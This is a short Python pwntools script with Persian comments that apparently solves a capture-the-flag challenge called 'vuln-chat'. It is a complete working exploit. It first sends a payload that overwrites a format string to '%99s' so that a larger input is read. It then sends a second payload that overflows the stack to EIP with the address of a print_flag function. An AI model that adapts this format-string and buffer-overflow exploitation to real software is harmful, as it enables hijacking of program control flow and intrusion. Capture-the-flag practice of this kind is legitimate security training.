from pwn import *

# فرآیند محلی
p = process('./vuln-chat')

# دریافت متن تا "username: "
print(p.recvuntil(b"username: "))

# payload اول: overwrite fmt به %99s (offset 20 بایت)
payload1 = b"A" * 20 + b"%99s"
p.sendline(payload1)

# دریافت متن تا پیام djinn
print(p.recvuntil(b"you?"))

# payload دوم: overflow به EIP (offset 0x31 + آدرس print_flag)
payload2 = b"B" * 0x31 + p32(0x804856b)

p.sendline(payload2)

# دریافت همه خروجی (flag چاپ می‌شه)
print(p.recvall().decode())